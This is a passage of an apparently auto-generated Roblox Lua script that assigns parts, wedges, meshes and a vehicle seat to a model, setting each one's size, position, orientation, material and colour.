Part278.CFrame = CFrame.new(-17.1098671, 6.70034742, 46.4597092, -1, 9.67943106e-06, -6.97521682e-05, 9.97899224e-06, 1, -1.5873462e-05, 7.57688613e-05, -1.16392221e-05, -1)
Part278.BackSurface = Enum.SurfaceType.Weld
Part278.BottomSurface = Enum.SurfaceType.Weld
Part278.FrontSurface = Enum.SurfaceType.Weld
Part278.LeftSurface = Enum.SurfaceType.Weld
Part278.RightSurface = Enum.SurfaceType.Weld
Part278.TopSurface = Enum.SurfaceType.Weld
Part278.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part278.Position = Vector3.new(-17.1098671, 6.70034742, 46.4597092)
Part278.Orientation = Vector3.new(0, -180, 0)
Part278.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh279.Parent = Part278
Part280.Parent = Model0
Part280.Material = Enum.Material.Metal
Part280.BrickColor = BrickColor.new("Grime")
Part280.Rotation = Vector3.new(180, 0, -180)
Part280.CanCollide = false
Part280.FormFactor = Enum.FormFactor.Custom
Part280.Size = Vector3.new(4, 3.60000014, 0.400000006)
Part280.CFrame = CFrame.new(-23.5096321, 6.40070248, 36.0604095, -1, 7.78029607e-06, -3.33969365e-05, 8.37296375e-06, 1, -1.92508596e-05, 4.53305838e-05, -1.08514441e-05, -1)
Part280.BackSurface = Enum.SurfaceType.Weld
Part280.BottomSurface = Enum.SurfaceType.Weld
Part280.FrontSurface = Enum.SurfaceType.Weld
Part280.LeftSurface = Enum.SurfaceType.Weld
Part280.RightSurface = Enum.SurfaceType.Weld
Part280.TopSurface = Enum.SurfaceType.Weld
Part280.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part280.Position = Vector3.new(-23.5096321, 6.40070248, 36.0604095)
Part280.Orientation = Vector3.new(0, -180, 0)
Part280.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh281.Parent = Part280
Part282.Parent = Model0
Part282.Material = Enum.Material.Metal
Part282.BrickColor = BrickColor.new("Grime")
Part282.Rotation = Vector3.new(-180, 0, -180)
Part282.CanCollide = false
Part282.FormFactor = Enum.FormFactor.Custom
Part282.Size = Vector3.new(1.00000012, 2.20000005, 5.19999981)
Part282.CFrame = CFrame.new(-26.0093632, 6.30065203, 33.6606827, -1, 9.146097e-06, -6.23015076e-05, 9.88777356e-06, 0.999991715, 1.19247252e-05, 7.7335586e-05, 2.23954721e-05, -1.00000143)
Part282.BackSurface = Enum.SurfaceType.Weld
Part282.BottomSurface = Enum.SurfaceType.Weld
Part282.FrontSurface = Enum.SurfaceType.Weld
Part282.LeftSurface = Enum.SurfaceType.Weld
Part282.RightSurface = Enum.SurfaceType.Weld
Part282.TopSurface = Enum.SurfaceType.Weld
Part282.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part282.Position = Vector3.new(-26.0093632, 6.30065203, 33.6606827)
Part282.Orientation = Vector3.new(0, -180, 0)
Part282.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh283.Parent = Part282
Part284.Parent = Model0
Part284.Material = Enum.Material.Metal
Part284.BrickColor = BrickColor.new("Grime")
Part284.Rotation = Vector3.new(-180, 0, -180)
Part284.FormFactor = Enum.FormFactor.Custom
Part284.Size = Vector3.new(0.400000095, 0.800000072, 5.19999981)
Part284.CFrame = CFrame.new(-26.7099648, 4.40034389, 38.8601379, -1, 6.28535236e-06, -2.60919842e-06, 6.58271165e-06, 1, 1.62551987e-06, 8.60384898e-06, 5.84486224e-06, -1)
Part284.BackSurface = Enum.SurfaceType.Weld
Part284.BottomSurface = Enum.SurfaceType.Weld
Part284.FrontSurface = Enum.SurfaceType.Weld
Part284.LeftSurface = Enum.SurfaceType.Weld
Part284.RightSurface = Enum.SurfaceType.Weld
Part284.TopSurface = Enum.SurfaceType.Weld
Part284.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part284.Position = Vector3.new(-26.7099648, 4.40034389, 38.8601379)
Part284.Orientation = Vector3.new(0, -180, 0)
Part284.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh285.Parent = Part284
Part286.Parent = Model0
Part286.Material = Enum.Material.Metal
Part286.BrickColor = BrickColor.new("Grime")
Part286.Rotation = Vector3.new(-180, -0.00999999978, -180)
Part286.CanCollide = false
Part286.FormFactor = Enum.FormFactor.Custom
Part286.Size = Vector3.new(1.00000012, 2.20000005, 5.19999981)
Part286.CFrame = CFrame.new(-26.0095215, 6.30111074, 44.0606766, -1, 9.61294518e-06, -0.000103726969, 9.90486296e-06, 1, 5.2497966e-05, 0.000109722117, 5.67162788e-05, -1)
Part286.BackSurface = Enum.SurfaceType.Weld
Part286.BottomSurface = Enum.SurfaceType.Weld
Part286.FrontSurface = Enum.SurfaceType.Weld
Part286.LeftSurface = Enum.SurfaceType.Weld
Part286.RightSurface = Enum.SurfaceType.Weld
Part286.TopSurface = Enum.SurfaceType.Weld
Part286.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part286.Position = Vector3.new(-26.0095215, 6.30111074, 44.0606766)
Part286.Orientation = Vector3.new(0, -179.98999, 0)
Part286.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh287.Parent = Part286
Part288.Name = "Brick"
Part288.Parent = Model0
Part288.Material = Enum.Material.Metal
Part288.BrickColor = BrickColor.new("Grime")
Part288.Transparency = 1
Part288.Rotation = Vector3.new(-98.1199951, 0, -180)
Part288.CanCollide = false
Part288.FormFactor = Enum.FormFactor.Custom
Part288.Size = Vector3.new(2, 0.200000003, 1.19999993)
Part288.CFrame = CFrame.new(-15.1093197, 9.22394657, 46.3002548, -1, 2.23412426e-05, -2.27283726e-06, 1.46798811e-06, 0.141308457, 0.989965618, 3.3739394e-05, 0.98996681, -0.141300574)
Part288.BackSurface = Enum.SurfaceType.Weld
Part288.BottomSurface = Enum.SurfaceType.Weld
Part288.FrontSurface = Enum.SurfaceType.Weld
Part288.LeftSurface = Enum.SurfaceType.Weld
Part288.RightSurface = Enum.SurfaceType.Weld
Part288.TopSurface = Enum.SurfaceType.Weld
Part288.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part288.Position = Vector3.new(-15.1093197, 9.22394657, 46.3002548)
Part288.Orientation = Vector3.new(-81.8799973, -180, 0)
Part288.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh289.Parent = Part288
BlockMesh289.Offset = Vector3.new(0, -0.189999998, 0)
Part290.Parent = Model0
Part290.Material = Enum.Material.Metal
Part290.BrickColor = BrickColor.new("Grime")
Part290.Rotation = Vector3.new(180, 0, -180)
Part290.FormFactor = Enum.FormFactor.Custom
Part290.Size = Vector3.new(0.400000095, 1.20000005, 5.19999981)
Part290.CFrame = CFrame.new(-26.709795, 4.60025549, 33.6601105, -1, 6.28825137e-06, -2.67255018e-06, 6.58563977e-06, 1, -9.30688202e-06, 8.66713162e-06, -5.08754056e-06, -1)
Part290.BackSurface = Enum.SurfaceType.Weld
Part290.BottomSurface = Enum.SurfaceType.Weld
Part290.FrontSurface = Enum.SurfaceType.Weld
Part290.LeftSurface = Enum.SurfaceType.Weld
Part290.RightSurface = Enum.SurfaceType.Weld
Part290.TopSurface = Enum.SurfaceType.Weld
Part290.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part290.Position = Vector3.new(-26.709795, 4.60025549, 33.6601105)
Part290.Orientation = Vector3.new(0, -180, 0)
Part290.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh291.Parent = Part290
Part292.Parent = Model0
Part292.Material = Enum.Material.Metal
Part292.BrickColor = BrickColor.new("Grime")
Part292.Rotation = Vector3.new(180, 0, -180)
Part292.FormFactor = Enum.FormFactor.Custom
Part292.Size = Vector3.new(0.400000095, 1.20000005, 5.19999981)
Part292.CFrame = CFrame.new(-26.7098675, 4.60042572, 44.0601082, -1, 6.28825137e-06, -2.67255018e-06, 6.58563977e-06, 1, -9.30688202e-06, 8.66713162e-06, -5.08754056e-06, -1)
Part292.BackSurface = Enum.SurfaceType.Weld
Part292.BottomSurface = Enum.SurfaceType.Weld
Part292.FrontSurface = Enum.SurfaceType.Weld
Part292.LeftSurface = Enum.SurfaceType.Weld
Part292.RightSurface = Enum.SurfaceType.Weld
Part292.TopSurface = Enum.SurfaceType.Weld
Part292.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part292.Position = Vector3.new(-26.7098675, 4.60042572, 44.0601082)
Part292.Orientation = Vector3.new(0, -180, 0)
Part292.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh293.Parent = Part292
WedgePart294.Parent = Model0
WedgePart294.Material = Enum.Material.Metal
WedgePart294.BrickColor = BrickColor.new("Grime")
WedgePart294.Rotation = Vector3.new(90, 0, -180)
WedgePart294.FormFactor = Enum.FormFactor.Custom
WedgePart294.Size = Vector3.new(22, 1.80000019, 0.800000131)
WedgePart294.CFrame = CFrame.new(-5.71021032, 8.60006523, 39.9598465, -1, 1.67611997e-05, -5.35971367e-06, 5.73934039e-06, 2.4999847e-06, -0.99999088, -9.10116614e-06, -1.00000012, -7.8765861e-06)
WedgePart294.BackSurface = Enum.SurfaceType.Weld
WedgePart294.BottomSurface = Enum.SurfaceType.Weld
WedgePart294.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart294.Position = Vector3.new(-5.71021032, 8.60006523, 39.9598465)
WedgePart294.Orientation = Vector3.new(89.7599945, -145.770004, 66.4599991)
WedgePart294.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh295.Parent = WedgePart294
SpecialMesh295.MeshType = Enum.MeshType.Wedge
WedgePart296.Parent = Model0
WedgePart296.Material = Enum.Material.Metal
WedgePart296.BrickColor = BrickColor.new("Grime")
WedgePart296.Rotation = Vector3.new(90, 0, 0)
WedgePart296.CanCollide = false
WedgePart296.FormFactor = Enum.FormFactor.Custom
WedgePart296.Size = Vector3.new(11.8000002, 0.400000006, 2.79999995)
WedgePart296.CFrame = CFrame.new(-10.8102522, 8.80012226, 46.259758, 1, 6.12342228e-06, -6.47552679e-06, -7.03663818e-06, 1.60052878e-05, -1, -1.74245251e-05, 1, 8.05025593e-06)
WedgePart296.BackSurface = Enum.SurfaceType.Weld
WedgePart296.BottomSurface = Enum.SurfaceType.Weld
WedgePart296.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart296.Position = Vector3.new(-10.8102522, 8.80012226, 46.259758)
WedgePart296.Orientation = Vector3.new(90, 0, 0)
WedgePart296.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh297.Parent = WedgePart296
SpecialMesh297.MeshType = Enum.MeshType.Wedge
WedgePart298.Parent = Model0
WedgePart298.Material = Enum.Material.Metal
WedgePart298.BrickColor = BrickColor.new("Grime")
WedgePart298.Rotation = Vector3.new(90, 0, 180)
WedgePart298.FormFactor = Enum.FormFactor.Custom
WedgePart298.Size = Vector3.new(10.1999998, 0.800000131, 1.00000012)
WedgePart298.CFrame = CFrame.new(0.190846562, 10.6997681, 41.8599472, -1, -1.71460924e-05, -7.07122672e-06, 7.44470481e-06, 3.71252099e-05, -0.99999088, 2.46954078e-05, -1.00000012, -4.24238897e-05)
WedgePart298.BackSurface = Enum.SurfaceType.Weld
WedgePart298.BottomSurface = Enum.SurfaceType.Weld
WedgePart298.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart298.Position = Vector3.new(0.190846562, 10.6997681, 41.8599472)
WedgePart298.Orientation = Vector3.new(89.7599945, -170.539993, 11.3400002)
WedgePart298.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh299.Parent = WedgePart298
SpecialMesh299.MeshType = Enum.MeshType.Wedge
WedgePart300.Parent = Model0
WedgePart300.Material = Enum.Material.Metal
WedgePart300.BrickColor = BrickColor.new("Grime")
WedgePart300.Rotation = Vector3.new(90, 0, 0)
WedgePart300.FormFactor = Enum.FormFactor.Custom
WedgePart300.Size = Vector3.new(22, 1.80000019, 0.800000131)
WedgePart300.CFrame = CFrame.new(-5.70992708, 8.6002655, 37.7604523, 1, -1.69808973e-05, -5.3198155e-06, -5.6994445e-06, -2.58807654e-06, -0.99999088, 9.32086368e-06, 1.00000012, -7.96467884e-06)
WedgePart300.BackSurface = Enum.SurfaceType.Weld
WedgePart300.BottomSurface = Enum.SurfaceType.Weld
WedgePart300.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart300.Position = Vector3.new(-5.70992708, 8.6002655, 37.7604523)
WedgePart300.Orientation = Vector3.new(89.7599945, -146.259995, -114.419998)
WedgePart300.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh301.Parent = WedgePart300
SpecialMesh301.MeshType = Enum.MeshType.Wedge
VehicleSeat302.Parent = Model0
VehicleSeat302.Material = Enum.Material.Metal
VehicleSeat302.BrickColor = BrickColor.new("Grime")
VehicleSeat302.Rotation = Vector3.new(0, 90, 0)
VehicleSeat302.Size = Vector3.new(2, 0.400000006, 2)
VehicleSeat302.CFrame = CFrame.new(-23.1098289, 4.8003788, 44.0599022, 1.1589701e-05, 5.60266608e-06, 1, -1.12916023e-05, 1, -6.19946923e-06, -1, -2.82160863e-06, -4.43901627e-07)
VehicleSeat302.TopSurface = Enum.SurfaceType.Weld
VehicleSeat302.HeadsUpDisplay = false
VehicleSeat302.MaxSpeed = 35
VehicleSeat302.Torque = 150
VehicleSeat302.Color = Color3.new(0.498039, 0.556863, 0.392157)
VehicleSeat302.Position = Vector3.new(-23.1098289, 4.8003788, 44.0599022)
VehicleSeat302.Orientation = Vector3.new(0, 90, 0)
VehicleSeat302.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart303.Parent = Model0
WedgePart303.Material = Enum.Material.Metal
WedgePart303.BrickColor = BrickColor.new("Grime")
WedgePart303.Rotation = Vector3.new(90, 0, -90)
WedgePart303.FormFactor = Enum.FormFactor.Custom
WedgePart303.Size = Vector3.new(5.19999933, 1, 1.20000005)
WedgePart303.CFrame = CFrame.new(-26.0089417, 4.60056925, 33.6610794, 1.45538397e-05, 1, -7.47078047e-06, -2.20777802e-05, -7.76782235e-06, -1, -1, 8.55936014e-06, 1.78583141e-05)
WedgePart303.BackSurface = Enum.SurfaceType.Weld
WedgePart303.BottomSurface = Enum.SurfaceType.Weld
WedgePart303.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart303.Position = Vector3.new(-26.0089417, 4.60056925, 33.6610794)
WedgePart303.Orientation = Vector3.new(90, 90, 0)
WedgePart303.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh304.Parent = WedgePart303
SpecialMesh304.MeshType = Enum.MeshType.Wedge
WedgePart305.Parent = Model0
WedgePart305.Material = Enum.Material.Metal
WedgePart305.BrickColor = BrickColor.new("Grime")
WedgePart305.Rotation = Vector3.new(90, 0, -180)
WedgePart305.FormFactor = Enum.FormFactor.Custom
WedgePart305.Size = Vector3.new(22, 0.600000143, 1.20000017)
WedgePart305.CFrame = CFrame.new(-5.71064138, 9.599576, 41.1605301, -1, 1.17034815e-05, -5.56241639e-06, 5.84649752e-06, -1.99384122e-05, -1, -5.97530743e-06, -1, 1.59061947e-05)
WedgePart305.BackSurface = Enum.SurfaceType.Weld
WedgePart305.BottomSurface = Enum.SurfaceType.Weld
WedgePart305.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart305.Position = Vector3.new(-5.71064138, 9.599576, 41.1605301)
WedgePart305.Orientation = Vector3.new(90, 180, 0)
WedgePart305.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh306.Parent = WedgePart305
SpecialMesh306.MeshType = Enum.MeshType.Wedge
WedgePart307.Parent = Model0
WedgePart307.Material = Enum.Material.Metal
WedgePart307.BrickColor = BrickColor.new("Grime")
WedgePart307.Rotation = Vector3.new(90, 0, 0)
WedgePart307.FormFactor = Enum.FormFactor.Custom
WedgePart307.Size = Vector3.new(22, 0.600000143, 1.20000017)
WedgePart307.CFrame = CFrame.new(-5.70935583, 9.60018349, 36.559742, 1, 5.02686817e-06, -6.43432486e-06, -6.48410469e-06, 8.01372698e-06, -1, -6.03618901e-06, 1, 7.30400461e-06)
WedgePart307.BackSurface = Enum.SurfaceType.Weld
WedgePart307.BottomSurface = Enum.SurfaceType.Weld
WedgePart307.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart307.Position = Vector3.new(-5.70935583, 9.60018349, 36.559742)
WedgePart307.Orientation = Vector3.new(90, 0, 0)
WedgePart307.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh308.Parent = WedgePart307
SpecialMesh308.MeshType = Enum.MeshType.Wedge
WedgePart309.Parent = Model0
WedgePart309.Material = Enum.Material.Metal
WedgePart309.BrickColor = BrickColor.new("Grime")
WedgePart309.Rotation = Vector3.new(90, 0, 0)
WedgePart309.FormFactor = Enum.FormFactor.Custom
WedgePart309.Size = Vector3.new(10.1999998, 0.800000131, 1.00000012)
WedgePart309.CFrame = CFrame.new(0.190338731, 10.7001028, 35.8596039, 1, 1.73247045e-05, -6.91621926e-06, -7.28482382e-06, -3.32206264e-06, -0.99999088, -2.47628068e-05, 1.00000012, -8.54242353e-06)
WedgePart309.BackSurface = Enum.SurfaceType.Weld
WedgePart309.BottomSurface = Enum.SurfaceType.Weld
WedgePart309.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart309.Position = Vector3.new(0.190338731, 10.7001028, 35.8596039)
WedgePart309.Orientation = Vector3.new(89.7599945, -141.009995, -114.509995)
WedgePart309.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh310.Parent = WedgePart309
SpecialMesh310.MeshType = Enum.MeshType.Wedge
WedgePart311.Parent = Model0
WedgePart311.Material = Enum.Material.Metal
WedgePart311.BrickColor = BrickColor.new("Grime")
WedgePart311.Rotation = Vector3.new(-90, 0, 90)
WedgePart311.FormFactor = Enum.FormFactor.Custom
WedgePart311.Size = Vector3.new(5.19999981, 1.39999998, 1.19999993)
WedgePart311.CFrame = CFrame.new(-26.2100182, 3.40037513, 33.6596451, -3.40397423e-06, -1, 6.33939817e-06, -9.03184537e-06, 6.52432982e-06, 1, -1, 7.16618433e-06, -6.38741267e-06)
WedgePart311.BackSurface = Enum.SurfaceType.Weld
WedgePart311.BottomSurface = Enum.SurfaceType.Weld
WedgePart311.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart311.Position = Vector3.new(-26.2100182, 3.40037513, 33.6596451)
WedgePart311.Orientation = Vector3.new(-90, 90, 0)
WedgePart311.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh312.Parent = WedgePart311
SpecialMesh312.MeshType = Enum.MeshType.Wedge
WedgePart313.Parent = Model0
WedgePart313.Material = Enum.Material.Metal
WedgePart313.BrickColor = BrickColor.new("Grime")
WedgePart313.Rotation = Vector3.new(90, 0, 0)
WedgePart313.FormFactor = Enum.FormFactor.Custom
WedgePart313.Size = Vector3.new(10.1999998, 1.60000014, 1.00000012)
WedgePart313.CFrame = CFrame.new(0.190321803, 10.6997337, 45.8596458, 1, 1.71271968e-05, -7.04050763e-06, -7.41398344e-06, -3.73043003e-05, -0.99999088, -2.46765048e-05, 1.00000012, -4.26029837e-05)
WedgePart313.BackSurface = Enum.SurfaceType.Weld
WedgePart313.BottomSurface = Enum.SurfaceType.Weld
WedgePart313.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart313.Position = Vector3.new(0.190321803, 10.6997337, 45.8596458)
WedgePart313.Orientation = Vector3.new(89.7599945, -170.619995, -168.759995)
WedgePart313.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh314.Parent = WedgePart313
SpecialMesh314.MeshType = Enum.MeshType.Wedge
WedgePart315.Parent = Model0
WedgePart315.Material = Enum.Material.Metal
WedgePart315.BrickColor = BrickColor.new("Grime")
WedgePart315.Rotation = Vector3.new(-90, 0, 90)
WedgePart315.FormFactor = Enum.FormFactor.Custom
WedgePart315.Size = Vector3.new(5.19999981, 1.39999998, 1.19999993)
WedgePart315.CFrame = CFrame.new(-26.2097702, 3.40055323, 44.0597954, 3.44685832e-05, -1, 5.8018918e-06, -6.04491834e-06, 5.80168262e-06, 1, -1, -3.44686086e-05, -6.04471643e-06)
WedgePart315.BackSurface = Enum.SurfaceType.Weld
WedgePart315.BottomSurface = Enum.SurfaceType.Weld
WedgePart315.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart315.Position = Vector3.new(-26.2097702, 3.40055323, 44.0597954)
WedgePart315.Orientation = Vector3.new(-90, 90, 0)
WedgePart315.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh316.Parent = WedgePart315
SpecialMesh316.MeshType = Enum.MeshType.Wedge
WedgePart317.Parent = Model0
WedgePart317.Material = Enum.Material.Metal
WedgePart317.BrickColor = BrickColor.new("Grime")
WedgePart317.Rotation = Vector3.new(180, 90, 0)
WedgePart317.FormFactor = Enum.FormFactor.Custom
WedgePart317.Size = Vector3.new(5.19999933, 1.20000005, 1)
WedgePart317.CFrame = CFrame.new(-26.0099239, 4.60073233, 33.6602364, -1.36232084e-05, -5.66421386e-06, 1, 2.05360793e-05, -1, -5.96129712e-06, 1, 1.63166333e-05, 7.62868513e-06)
WedgePart317.BottomSurface = Enum.SurfaceType.Weld
WedgePart317.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart317.Position = Vector3.new(-26.0099239, 4.60073233, 33.6602364)
WedgePart317.Orientation = Vector3.new(0, 90, 180)
WedgePart317.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh318.Parent = WedgePart317
SpecialMesh318.MeshType = Enum.MeshType.Wedge
WedgePart319.Parent = Model0
WedgePart319.Material = Enum.Material.Metal
WedgePart319.BrickColor = BrickColor.new("Grime")
WedgePart319.Rotation = Vector3.new(90, 0, -0.00999999978)
WedgePart319.CanCollide = false
WedgePart319.FormFactor = Enum.FormFactor.Custom
WedgePart319.Size = Vector3.new(0.400000006, 0.400000006, 3)
WedgePart319.CFrame = CFrame.new(-22.7094574, 8.90267277, 46.4604378, 1, 0.000103821971, -1.11975369e-05, -1.19384558e-05, -2.19714639e-06, -1, -0.000118742879, 1, -1.27009662e-05)
WedgePart319.BackSurface = Enum.SurfaceType.Weld
WedgePart319.BottomSurface = Enum.SurfaceType.Weld
WedgePart319.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart319.Position = Vector3.new(-22.7094574, 8.90267277, 46.4604378)
WedgePart319.Orientation = Vector3.new(90, 0.00999999978, 0)
WedgePart319.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh320.Parent = WedgePart319
SpecialMesh320.MeshType = Enum.MeshType.Wedge
WedgePart321.Parent = Model0
WedgePart321.Material = Enum.Material.Metal
WedgePart321.BrickColor = BrickColor.new("Grime")
WedgePart321.Rotation = Vector3.new(90, 0, 0)
WedgePart321.CanCollide = false
WedgePart321.FormFactor = Enum.FormFactor.Custom
WedgePart321.Size = Vector3.new(0.400000006, 1.20000005, 0.999999821)
WedgePart321.CFrame = CFrame.new(-25.7095184, 7.90136623, 42.4608383, 1, 7.70654951e-05, -9.90780518e-06, -1.02004242e-05, -6.15640529e-05, -1, -8.3060746e-05, 1, -6.57826022e-05)
WedgePart321.BackSurface = Enum.SurfaceType.Weld
WedgePart321.BottomSurface = Enum.SurfaceType.Weld
WedgePart321.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart321.Position = Vector3.new(-25.7095184, 7.90136623, 42.4608383)
WedgePart321.Orientation = Vector3.new(90, 0, 0)
WedgePart321.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh322.Parent = WedgePart321
SpecialMesh322.MeshType = Enum.MeshType.Wedge
WedgePart323.Parent = Model0
WedgePart323.Material = Enum.Material.Metal
WedgePart323.BrickColor = BrickColor.new("Grime")
WedgePart323.Rotation = Vector3.new(90, 0, -90)
WedgePart323.FormFactor = Enum.FormFactor.Custom
WedgePart323.Size = Vector3.new(5.19999933, 1, 1.20000005)
WedgePart323.CFrame = CFrame.new(-26.0092163, 4.60065508, 44.0591469, 1.43750112e-05, 1, -7.43051987e-06, -2.22713134e-05, -7.72756266e-06, -1, -1, 8.38053529e-06, 1.80518491e-05)
WedgePart323.BackSurface = Enum.SurfaceType.Weld
WedgePart323.BottomSurface = Enum.SurfaceType.Weld
WedgePart323.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart323.Position = Vector3.new(-26.0092163, 4.60065508, 44.0591469)
WedgePart323.Orientation = Vector3.new(90, 90, 0)
WedgePart323.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh324.Parent = WedgePart323
SpecialMesh324.MeshType = Enum.MeshType.Wedge
WedgePart325.Parent = Model0
WedgePart325.Material = Enum.Material.Metal
WedgePart325.BrickColor = BrickColor.new("Grime")
WedgePart325.Rotation = Vector3.new(-90, 0, 0)
WedgePart325.CanCollide = false
WedgePart325.FormFactor = Enum.FormFactor.Custom
WedgePart325.Size = Vector3.new(0.200000003, 0.200000003, 2.60000014)
WedgePart325.CFrame = CFrame.new(-16.8097363, 8.70052814, 46.1599655, 1, -2.12305386e-05, 7.18997535e-06, -8.38811684e-06, -4.9342907e-06, 1, -4.53438988e-05, -1, 1.20436125e-05)
WedgePart325.BackSurface = Enum.SurfaceType.Weld
WedgePart325.BottomSurface = Enum.SurfaceType.Weld
WedgePart325.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart325.Position = Vector3.new(-16.8097363, 8.70052814, 46.1599655)
WedgePart325.Orientation = Vector3.new(-90, 0, 0)
WedgePart325.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh326.Parent = WedgePart325
SpecialMesh326.MeshType = Enum.MeshType.Wedge
WedgePart327.Parent = Model0
WedgePart327.Material = Enum.Material.Metal
WedgePart327.BrickColor = BrickColor.new("Grime")
WedgePart327.Rotation = Vector3.new(-90, 0, 0)
WedgePart327.CanCollide = false
WedgePart327.FormFactor = Enum.FormFactor.Custom
WedgePart327.Size = Vector3.new(0.200000003, 0.200000003, 2.60000014)
WedgePart327.CFrame = CFrame.new(-19.6100292, 8.70045471, 46.1600151, 1, -2.11709685e-05, 7.23711082e-06, -8.43528869e-06, -6.71051566e-06, 1, -4.52843196e-05, -1, 1.02673966e-05)
WedgePart327.BackSurface = Enum.SurfaceType.Weld
WedgePart327.BottomSurface = Enum.SurfaceType.Weld
WedgePart327.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart327.Position = Vector3.new(-19.6100292, 8.70045471, 46.1600151)
WedgePart327.Orientation = Vector3.new(-90, 0, 0)
WedgePart327.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh328.Parent = WedgePart327
SpecialMesh328.MeshType = Enum.MeshType.Wedge
WedgePart329.Parent = Model0
WedgePart329.Material = Enum.Material.Metal
WedgePart329.BrickColor = BrickColor.new("Grime")
WedgePart329.Rotation = Vector3.new(90, 0, -0.00999999978)
WedgePart329.CanCollide = false
WedgePart329.FormFactor = Enum.FormFactor.Custom
WedgePart329.Size = Vector3.new(0.200000003, 0.400000006, 3)
WedgePart329.CFrame = CFrame.new(-16.8093224, 8.90175629, 46.4594421, 1, 9.91064226e-05, -1.10202109e-05, -1.22203146e-05, 2.08557285e-05, -1, -0.000123219652, 1, 3.87895125e-06)
WedgePart329.BackSurface = Enum.SurfaceType.Weld
WedgePart329.BottomSurface = Enum.SurfaceType.Weld
WedgePart329.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart329.Position = Vector3.new(-16.8093224, 8.90175629, 46.4594421)
WedgePart329.Orientation = Vector3.new(90, 0.00999999978, 0)
WedgePart329.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh330.Parent = WedgePart329
SpecialMesh330.MeshType = Enum.MeshType.Wedge
WedgePart331.Parent = Model0
WedgePart331.Material = Enum.Material.Metal
WedgePart331.BrickColor = BrickColor.new("Grime")
WedgePart331.Rotation = Vector3.new(180, -90, 0)
WedgePart331.FormFactor = Enum.FormFactor.Custom
WedgePart331.Size = Vector3.new(5.19999886, 2, 1.79999995)
WedgePart331.CFrame = CFrame.new(-16.609787, 5.0004549, 33.6600304, -4.89594822e-06, -6.62594812e-06, -1, -8.07483866e-06, -0.999996543, 6.68015446e-06, -1, 7.30284228e-06, 5.9940694e-06)
WedgePart331.BottomSurface = Enum.SurfaceType.Smooth
WedgePart331.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart331.Position = Vector3.new(-16.609787, 5.0004549, 33.6600304)
WedgePart331.Orientation = Vector3.new(0, -90, -180)
WedgePart331.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh332.Parent = WedgePart331
SpecialMesh332.MeshType = Enum.MeshType.Wedge
WedgePart333.Parent = Model0
WedgePart333.Material = Enum.Material.Metal
WedgePart333.BrickColor = BrickColor.new("Grime")
WedgePart333.Rotation = Vector3.new(180, 90, 0)
WedgePart333.FormFactor = Enum.FormFactor.Custom
WedgePart333.Size = Vector3.new(5.19999933, 1.20000005, 1)
WedgePart333.CFrame = CFrame.new(-26.00951, 4.60169315, 44.0594978, -7.2284929e-06, -6.09822428e-06, 1, 1.73822391e-05, -1, -6.69012343e-06, 1, 8.98247345e-06, -4.70518717e-06)
WedgePart333.BottomSurface = Enum.SurfaceType.Weld
WedgePart333.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart333.Position = Vector3.new(-26.00951, 4.60169315, 44.0594978)
WedgePart333.Orientation = Vector3.new(0, 90, 180)
WedgePart333.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh334.Parent = WedgePart333
SpecialMesh334.MeshType = Enum.MeshType.Wedge
WedgePart335.Parent = Model0
WedgePart335.Material = Enum.Material.Metal
WedgePart335.BrickColor = BrickColor.new("Grime")
